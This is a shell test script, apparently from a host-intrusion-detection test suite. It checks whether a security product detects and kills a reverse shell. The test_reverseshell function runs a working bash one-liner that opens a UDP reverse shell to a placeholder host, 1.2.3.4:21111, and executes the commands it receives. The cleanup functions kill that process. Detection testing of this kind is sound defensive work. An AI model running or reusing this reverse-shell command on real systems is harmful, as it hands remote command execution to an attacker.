test_reverseshell()
{
	echo "== Reverseshell Test =="

	#事件
	bash -c "exec 5<>/dev/udp/1.2.3.4/21111;cat <&5 | while read line; do $line 2>&5 >&5; done" &

	netstat -uapn 2>/dev/null | grep "1.2.3.4:21111"
	ps -eaf | grep "1.2.3.4/21111" | grep -v grep

	#非事件

}

test_reverseshell_clean()
{
	echo "== Reverseshell Test Clean =="

	cmdpid=`ps -eaf | grep "1.2.3.4/21111" | grep -v grep | awk '{print $2}'`
	if [ "$cmdpid" != "" ]; then
		count=`echo $cmdpid | wc -l`
                if [ $count -eq 2 -a "$study" = "" -a "$operation" = "" -a $event_kill -ne 0 ]; then
                        echo "Error: reverseshell running, terminate policy fails"
			ps -eaf | grep "1.2.3.4/21111" | grep -v grep
                        echo
                fi
		kill -9 $cmdpid
	fi

	cmdpid=`netstat -uapn 2>/dev/null | grep "1.2.3.4:21111" | awk '{print $7}' | cut -f1 -d"/"`
	if [ "$cmdpid" != "" ]; then
		kill -9 $cmdpid
	fi
}

test_reverseshell_wait_stop()
{
	i=0
	while [ 1 ]
	do
		count=`ps -eaf | grep "1.2.3.4/21111" | grep -v grep | wc -l`
		if [ $count -lt 2 ]; then
			break
		fi

		echo "wait 1s for reverseshell stopped"
		sleep 1

		i=`expr $i + 1`
		if [ $i -ge 60 ]; then
			echo "total wait 60s for reverseshell stopped, fail"
			break
		fi
	done
}
